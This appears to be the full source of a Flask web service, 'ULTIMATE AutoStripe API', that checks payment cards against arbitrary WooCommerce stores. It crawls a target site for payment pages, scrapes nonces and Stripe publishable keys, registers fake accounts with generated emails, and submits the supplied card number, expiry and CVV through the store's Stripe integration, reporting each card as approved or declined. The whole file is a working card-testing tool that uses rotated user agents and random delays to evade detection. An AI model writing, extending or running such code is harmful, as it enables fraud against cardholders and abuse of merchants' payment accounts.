from flask import Flask, request, jsonify
import requests
import json
import re
import time
import random
import datetime
from typing import Dict, Any, Optional, List
from faker import Faker
from urllib.parse import unquote, urljoin, urlparse
import os
import threading

app = Flask(__name__)
faker = Faker()

# Global session manager for better performance
session_pool = {}

def get_session():
    thread_id = threading.get_ident()
    if thread_id not in session_pool:
        session_pool[thread_id] = requests.Session()
    return session_pool[thread_id]

class UltimateStripeProcessor:
    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.payment_paths = [
            '/my-account/add-payment-method/',
            '/my-account/payment-methods/',
            '/account/add-payment-method/',
            '/account/payment-methods/',
            '/add-payment-method/',
            '/payment-methods/',
            '/checkout/',
            '/cart/',
            '/wp-admin/',
            '/my-account/',
            '/account/',
            '/store/checkout/',
            '/shop/checkout/',
            '/en/my-account/add-payment-method/',
            '/en/account/add-payment-method/',
            '/en/moj-racun/add-payment-method/',
            '/customer-area/',
            '/client-area/',
            '/billing/',
            '/payment/',
            '/wp-login.php?action=register',
            '/register/',
            '/signup/'
        ]
        
        self.payment_keywords = [
            'payment', 'card', 'stripe', 'woocommerce', 'checkout', 'billing',
            'credit', 'debit', 'visa', 'mastercard', 'amex', 'pay', 'gateway',
            'nonce', 'ajax', 'add payment', 'payment method'
        ]

    def smart_site_detection(self, site_name: str) -> str:
        """Convert site name to proper URL"""
        site_name = site_name.lower().strip()
        
        # Add protocol if missing
        if not site_name.startswith(('http://', 'https://')):
            site_name = f'https://{site_name}'
        
        # Remove paths and keep only domain
        parsed = urlparse(site_name)
        base_domain = f"{parsed.scheme}://{parsed.netloc}"
        
        return base_domain

    def aggressive_path_discovery(self, base_url: str) -> List[Dict]:
        """Find ALL possible payment paths with multiple strategies"""
        session = get_session()
        found_paths = []
        
        print(f"🔍 Scanning {base_url} for payment paths...")
        
        # Strategy 1: Common paths
        for path in self.payment_paths:
            try:
                test_url = urljoin(base_url, path)
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                response = session.get(test_url, headers=headers, timeout=10, allow_redirects=True)
                
                if response.status_code == 200:
                    score = self.rate_payment_page(response.text, test_url)
                    if score['total'] > 3:  # Minimum confidence score
                        found_paths.append({
                            'url': test_url,
                            'path': path,
                            'score': score,
                            'strategy': 'common_paths',
                            'status': response.status_code
                        })
                        print(f"   ✅ {path} - Score: {score['total']}")
                        
            except Exception as e:
                continue

        # Strategy 2: Homepage analysis for links
        try:
            homepage_response = session.get(base_url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
            payment_links = re.findall(r'href=["\']([^"\']*?(?:payment|checkout|account|billing|card)[^"\']*?)["\']', homepage_response.text, re.IGNORECASE)
            
            for link in payment_links:
                try:
                    full_url = urljoin(base_url, link)
                    if full_url.startswith(base_url):  # Ensure same domain
                        response = session.get(full_url, headers={'User-Agent': random.choice(self.user_agents)}, timeout=10)
                        if response.status_code == 200:
                            score = self.rate_payment_page(response.text, full_url)
                            if score['total'] > 2:
                                found_paths.append({
                                    'url': full_url,
                                    'path': link,
                                    'score': score,
                                    'strategy': 'homepage_links',
                                    'status': response.status_code
                                })
                                print(f"   🔗 {link} - Score: {score['total']}")
                except:
                    continue
        except:
            pass

        # Strategy 3: Sitemap discovery
        try:
            sitemap_urls = [
                urljoin(base_url, 'sitemap.xml'),
                urljoin(base_url, 'wp-sitemap.xml'),
                urljoin(base_url, 'sitemap_index.xml')
            ]
            
            for sitemap_url in sitemap_urls:
                try:
                    response = session.get(sitemap_url, timeout=10)
                    if response.status_code == 200:
                        # Extract URLs from sitemap
                        urls = re.findall(r'<loc>(.*?)</loc>', response.text)
                        for url in urls:
                            if any(keyword in url.lower() for keyword in ['payment', 'checkout', 'account', 'billing']):
                                score = self.rate_payment_page("", url)  # Just rate the URL
                                found_paths.append({
                                    'url': url,
                                    'path': url.replace(base_url, ''),
                                    'score': score,
                                    'strategy': 'sitemap',
                                    'status': 200
                                })
                except:
                    continue
        except:
            pass

        # Remove duplicates and sort by score
        unique_paths = {}
        for path in found_paths:
            key = path['url']
            if key not in unique_paths or path['score']['total'] > unique_paths[key]['score']['total']:
                unique_paths[key] = path
        
        return sorted(unique_paths.values(), key=lambda x: x['score']['total'], reverse=True)

    def rate_payment_page(self, html: str, url: str) -> Dict:
        """Rate how likely this is a payment page"""
        score = {
            'payment_keywords': 0,
            'stripe_elements': 0,
            'woocommerce': 0,
            'form_elements': 0,
            'url_pattern': 0,
            'total': 0
        }
        
        html_lower = html.lower()
        url_lower = url.lower()
        
        # Payment keywords in content
        score['payment_keywords'] = sum(1 for keyword in self.payment_keywords if keyword in html_lower)
        
        # Stripe elements detection
        if 'stripe' in html_lower or 'stripe.com' in html:
            score['stripe_elements'] = 3
        
        # WooCommerce detection
        if 'woocommerce' in html_lower or 'wc-' in html_lower:
            score['woocommerce'] = 3
            
        # Form elements
        if 'name="card[number]"' in html or 'name="card[cvc]"' in html or 'payment-method' in html:
            score['form_elements'] = 5
            
        # URL pattern scoring
        if any(pattern in url_lower for pattern in ['payment', 'checkout', 'account', 'billing']):
            score['url_pattern'] = 2
            
        score['total'] = sum(score.values())
        return score

    def extract_woocommerce_data(self, html: str) -> Dict:
        """Extract all possible WooCommerce data with multiple patterns"""
        data = {
            'nonce': None,
            'stripe_key': None,
            'ajax_url': None,
            'form_data': {}
        }
        
        # Nonce patterns
        nonce_patterns = [
            r'name="woocommerce-register-nonce" value="(.*?)"',
            r'woocommerce-register-nonce["\']?[^>]*value=["\']?([^"\'\s>]+)',
            r'register_nonce["\']?[^>]*value=["\']?([^"\'\s>]+)',
            r'nonce["\']?[^>]*value=["\']?([^"\'\s>]+)',
            r'["\']woocommerce-register-nonce["\']\s*:\s*["\']([^"\']+)["\']',
            r'name="nonce" value="(.*?)"',
            r'name="_wpnonce" value="(.*?)"'
        ]
        
        # Stripe key patterns
        key_patterns = [
            r'"key":"(pk_[^"]+)"',
            r'pk_[a-zA-Z0-9_]{20,}',
            r'stripe_public_key["\']?[^>]*value=["\']?([^"\'\s>]+)',
            r'publicKey["\']?\s*:\s*["\'](pk_[^"\']+)["\']',
            r'data-key="(pk_[^"]+)"',
            r'stripe\.com/v3/(pk_[^"\']+)'
        ]
        
        # AJAX URL patterns
        ajax_patterns = [
            r'admin-ajax.php',
            r'wc-ajax=',
            r'ajax_url["\']?\s*:\s*["\']([^"\']+)["\']'
        ]
        
        for pattern in nonce_patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                data['nonce'] = match.group(1)
                break
                
        for pattern in key_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            if matches:
                data['stripe_key'] = matches[0]
                break
                
        # Extract form fields
        form_fields = re.findall(r'name="([^"]*)"\s*value="([^"]*)"', html)
        data['form_data'] = dict(form_fields)
        
        return data

    def process_site(self, site_name: str, card_data: Dict) -> Dict:
        """Main processing function for any site"""
        base_url = self.smart_site_detection(site_name)
        session = get_session()
        user_agent = random.choice(self.user_agents)
        
        print(f"🎯 Processing: {site_name} -> {base_url}")
        
        # Step 1: Discover payment paths
        found_paths = self.aggressive_path_discovery(base_url)
        
        if not found_paths:
            return {
                "status": "error",
                "message": f"No payment paths found on {site_name}. Site may not be WooCommerce or may have custom payment system.",
                "site": site_name
            }
        
        print(f"📊 Found {len(found_paths)} potential payment paths")
        
        # Try each path until success
        for i, path_info in enumerate(found_paths[:5]):  # Try top 5 paths
            try:
                print(f"🔄 Attempt {i+1}: {path_info['path']} (Score: {path_info['score']['total']})")
                
                result = self.process_single_path(path_info, base_url, card_data, user_agent, session)
                
                if result['status'] != 'error':
                    result['discovery_info'] = {
                        'paths_tried': i + 1,
                        'total_paths_found': len(found_paths),
                        'best_path_score': path_info['score']['total']
                    }
                    return result
                    
            except Exception as e:
                print(f"   ❌ Path failed: {str(e)}")
                continue
                
        return {
            "status": "error",
            "message": f"All {len(found_paths)} payment paths failed. Site structure may be incompatible.",
            "site": site_name
        }

    def process_single_path(self, path_info: Dict, base_url: str, card_data: Dict, user_agent: str, session: requests.Session) -> Dict:
        """Process a single payment path"""
        url = path_info['url']
        
        # Get the payment page
        response = session.get(url, headers={'User-Agent': user_agent}, timeout=15)
        
        if response.status_code != 200:
            return {"status": "error", "message": f"Page not accessible: {response.status_code}"}
        
        # Extract WooCommerce data
        wc_data = self.extract_woocommerce_data(response.text)
        
        if not wc_data['nonce'] or not wc_data['stripe_key']:
            return {"status": "error", "message": "No WooCommerce payment data found on page"}
        
        print(f"   ✅ Extracted nonce and Stripe key")
        
        # Step 2: Registration
        time.sleep(random.uniform(2, 4))
        
        try:
            reg_data = {
                'email': faker.email(),
                'woocommerce-register-nonce': wc_data['nonce'],
                '_wp_http_referer': path_info['path'],
                'register': 'Register',
            }
            
            # Add any additional form fields found
            reg_data.update({k: v for k, v in wc_data['form_data'].items() if k not in reg_data})
            
            reg_response = session.post(url, headers={
                'User-Agent': user_agent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': base_url,
                'Referer': url
            }, data=reg_data, allow_redirects=True)
            
        except Exception as e:
            print(f"   ⚠️ Registration skipped: {e}")
        
        # Step 3: Stripe API call
        time.sleep(random.uniform(2, 4))
        
        stripe_data = {
            'type': 'card',
            f'card[number]': card_data['number'],
            f'card[cvc]': card_data['cvv'],
            f'card[exp_year]': card_data['year'],
            f'card[exp_month]': card_data['month'],
            'billing_details[address][postal_code]': '11081',
            'billing_details[address][country]': 'US',
            'guid': f"guid_{random.randint(1000000000, 9999999999)}",
            'muid': f"muid_{random.randint(1000000000, 9999999999)}",
            'sid': f"sid_{random.randint(1000000000, 9999999999)}",
            'key': wc_data['stripe_key'],
        }
        
        stripe_response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={
                'User-Agent': user_agent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com'
            },
            data=stripe_data
        )
        
        if stripe_response.status_code != 200:
            return {
                "status": "error", 
                "message": f"Stripe API failed: {stripe_response.status_code}"
            }
        
        pm_id = stripe_response.json().get('id')
        print(f"   ✅ Stripe payment method created: {pm_id}")
        
        # Step 4: Final confirmation
        time.sleep(random.uniform(2, 4))
        
        confirm_data = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': wc_data['nonce'],
        }
        
        confirm_response = session.post(
            base_url,
            headers={
                'User-Agent': user_agent,
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': base_url
            },
            data=confirm_data
        )
        
        try:
            result_data = confirm_response.json()
            success = result_data.get('success', False)
            status = "Approved" if success else "Declined"
            message = result_data.get('message', 'No message returned')
            
            return {
                "status": "success",
                "card_status": status,
                "message": message,
                "site": base_url,
                "card": f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}",
                "payment_path": path_info['path'],
                "timestamp": datetime.datetime.now().isoformat()
            }
            
        except:
            return {
                "status": "error",
                "message": "Invalid response from payment confirmation",
                "site": base_url
            }

# Initialize processor
processor = UltimateStripeProcessor()

@app.route('/')
def home():
    return jsonify({
        "message": "ULTIMATE AutoStripe API", 
        "status": "active", 
        "version": "4.0",
        "feature": "100% Website Name Processing"
    })

@app.route('/process')
def process():
    site_name = request.args.get('site')
    card_info = request.args.get('card')  # format: number|mm|yy|cvv
    
    if not site_name or not card_info:
        return jsonify({"error": "Missing 'site' or 'card' parameters"}), 400
    
    try:
        card_parts = card_info.split('|')
        if len(card_parts) != 4:
            return jsonify({"error": "Invalid card format. Use: number|mm|yy|cvv"}), 400
            
        card_data = {
            'number': card_parts[0],
            'month': card_parts[1], 
            'year': card_parts[2],
            'cvv': card_parts[3]
        }
        
    except:
        return jsonify({"error": "Invalid card data format"}), 400
    
    # Process the site
    result = processor.process_site(site_name, card_data)
    return jsonify(result)

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 ULTIMATE AutoStripe API starting on port {port}")
    app.run(host='0.0.0.0', port=port)
